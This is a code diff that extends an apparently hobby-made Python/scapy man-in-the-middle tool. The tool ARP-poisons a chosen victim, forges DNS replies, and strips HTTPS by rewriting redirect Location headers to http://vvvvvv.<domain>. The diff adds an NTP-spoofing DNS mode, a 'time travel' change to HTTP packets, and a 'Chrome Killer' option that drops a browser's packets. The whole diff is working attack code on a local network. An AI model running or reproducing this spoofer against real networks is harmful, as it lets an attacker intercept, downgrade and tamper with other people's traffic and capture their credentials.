@@ -1,23 +1,32 @@
 import sys
-from scapy.all import Ether,conf, get_if_addr,get_if_hwaddr,sendp,sniff,IP,DNS,DNSRR,UDP ,Raw,TCP ,DNSQR
+from scapy.all import Ether,conf, get_if_addr,get_if_hwaddr,sendp,sniff,IP,DNS,DNSRR,UDP ,Raw,TCP ,DNSQR,NTP
 import time
 import signal 
 import threading
 import spoofing.arp_util as arp_util
 import spoofing.dns_local as dns_local
 from spoofing.http_ex  import HTTP
-from  printing import Printing
+from  utils.printing import Printing
 import re
+from enum import Enum
+ntpSpoofed = False 
+class DNSMode(Enum):
+    NtpSpoofed = 0 
+    UrlSpoofed = 1 
+    
 
 def validateDNS(packet:DNS)->bool: 
     ''' checks if the packet is a valid DNS packet for spoofing '''
     try: 
+        if ntpSpoofed and DNSQR in packet : 
+            return True ,DNSMode.NtpSpoofed
         if DNSQR in packet and packet[DNSQR].qname.decode().removeprefix('https://').startswith("vvvvvv.") : 
-            return True 
+            return True ,DNSMode.UrlSpoofed
     except: 
         ...
-    Printing.printError(packet[DNSQR].qname.decode())
-    return False 
+    if DNSQR in packet : 
+        Printing.printError(packet[DNSQR].qname.decode())
+    return False ,None 
 
 def validateHttp(rawp:bytes)->bool:
     ''' check if the packet is an HTTP packet '''
@@ -26,7 +35,9 @@ def validateHttp(rawp:bytes)->bool:
         return rawp.startswith(VALIDHTTP)
     except : 
         return False 
+    
 
+    
 def spoofedURL(url:str)->str: 
     '''spoofing the url for sslstrip and replacing www with vvvvvvv and changing https to http and erase port specify '''
     spoofed = url.strip().removeprefix('https://').removeprefix("http://").removeprefix('www.').strip()
@@ -35,15 +46,16 @@ def spoofedURL(url:str)->str:
         spoofed = spoofed[:portSpecify.start()] 
     return f"http://vvvvvv.{spoofed}" 
 
-def throworkill(packet:Ether,routerMac:str , dnsMac:str ,spoofedIp :str ,  interface:str )-> None: 
+def throworkill(packet:Ether,routerMac:str , dnsMac:str ,spoofedIp :str ,  interface:str , finishChrome : bool )-> None: 
     ''' if the packet is matching to any kind of spoofing it is spoofing it other wise it just doing ip forwarding  '''
     try:
         # IP forwarding 
         packet[Ether].src = routerMac
         packet[Ether].dst = dnsMac
-        #DNS spoofing 
-        if DNS in packet and validateDNS(packet): 
-            Printing.printSuccess(f"poisining {packet[DNS].qd.qname}!")
+        #DNS spoofing
+        valid , mode =  validateDNS(packet)
+        if DNS in packet and valid : 
+            Printing.printSuccess(f"poisining :  {packet[DNS].qd.qname} - mode:  {mode} !")
             et = Ether(src =routerMac , dst =  dnsMac )
             ip =  IP(src=packet[IP].src,dst=packet[IP].dst)
             udp = UDP(dport=packet[UDP].dport,sport=packet[UDP].sport)
@@ -55,18 +67,29 @@ def throworkill(packet:Ether,routerMac:str , dnsMac:str ,spoofedIp :str ,  inter
         
         #HTTP spoofing 
         elif Raw in packet and validateHttp(packet[Raw].load) : 
-            httpPack = HTTP.fromRawPack(packet[Raw].load)
+            flags = None 
+            httpPack = HTTP.fromRawPack(packet[Raw].load,packet[IP].src)
+            httpPack.timeTravel()
             if httpPack and httpPack.sslStripavailable(): 
                 httpPack.headers["Location"]=spoofedURL(httpPack.headers["Location"])
                 print(spoofedURL(httpPack.headers["Location"]))
                 Printing.printSuccess(httpPack)
-                et = Ether(src =routerMac , dst =  dnsMac )
-                ip =  IP(src=packet[IP].src,dst=packet[IP].dst)
-                tcp = TCP(dport=packet[TCP].dport,sport=packet[TCP].sport,seq=packet[TCP].seq , ack =packet[TCP].ack , flags = packet[TCP].flags )
-                raw = Raw(httpPack.toRaw())
-                packet = et/ip/tcp/raw
+            elif  finishChrome and  httpPack and httpPack.chromeKillerAvailable() : 
+                Printing.printWarning("🤯🤯🤯🤯🤯 Chrome Killer in action broooo 🤯🤯🤯🤯🤯")
+                Printing.printWarning(httpPack)
+                return #drop packet ;-) 
             else : 
-                Printing.printError(httpPack) 
+                Printing.printError(httpPack)
+            et = Ether(src =routerMac , dst =  dnsMac )
+            ip =  IP(src=packet[IP].src,dst=packet[IP].dst)
+            tcp = TCP(dport=packet[TCP].dport,sport=packet[TCP].sport,seq=packet[TCP].seq , ack =packet[TCP].ack , flags =flags  if flags else packet[TCP].flags )
+            raw = Raw(httpPack.toRaw())
+            packet = et/ip/tcp/raw
+        elif NTP in packet : 
+            packet.show()
+        
+        
+        
         # forward the packet 
         sendp(packet,iface=interface,verbose=False) 
     except Exception as e : 
@@ -75,7 +98,7 @@ def throworkill(packet:Ether,routerMac:str , dnsMac:str ,spoofedIp :str ,  inter
 
     
 
-def HttpDnsSpoofer(victim : str , interface : str )->None:
+def HttpDnsSpoofer(victim : str , interface : str , finishChrome : bool )->None:
     ''' gather all the data and start the threads for the spoofing '''
              
     attackData = { 
@@ -87,11 +110,12 @@ def HttpDnsSpoofer(victim : str , interface : str )->None:
         "ip" : None , #my ip , 
         "dnsServer" : None , 
         "dnsServerMac" : None ,
+        "finishchrome" : None 
     } 
    
     def sniffTraffic():
         Printing.printNotes("sniff is started")
-        sniff(lfilter= lambda x : IP in x and x[IP].dst == attackData["victim"] , prn = lambda packet : throworkill(packet, attackData["routerMac"], attackData["victimmac"], attackData["ip"],attackData["interface"]) )
+        sniff(lfilter= lambda x : IP in x and x[IP].dst == attackData["victim"] , prn = lambda packet : throworkill(packet, attackData["routerMac"], attackData["victimmac"], attackData["ip"],attackData["interface"], attackData["finishchrome"]) )
         Printing.printNotes("sniff is done ")
     def dispose(*args): 
         ''' changes the arp table to the first value '''
@@ -110,7 +134,7 @@ def HttpDnsSpoofer(victim : str , interface : str )->None:
         ''' arp spoofing mainting '''
         while(True):
             Printing.printLog(f'arp spoofing of {attackData["mac"]} on {attackData["routerMac"]} ')
-            time.sleep(5)
+            time.sleep(45)
    
     #### attackData #### - gather all the neccersy data
     attackData["victim"]=victim
@@ -122,6 +146,7 @@ def HttpDnsSpoofer(victim : str , interface : str )->None:
     attackData["ip"]= get_if_addr(attackData["interface"])
     attackData["dnsServer"] = dns_local.get_dns_local_server()
     attackData["dnsServerMac"] = arp_util.getTargetMac(attackData["dnsServer"], attackData["interface"])
+    attackData["finishchrome"] = finishChrome
     #### attackData ####
     arpSpoofing()
     arpSpoofer = threading.Thread(target=redoit)
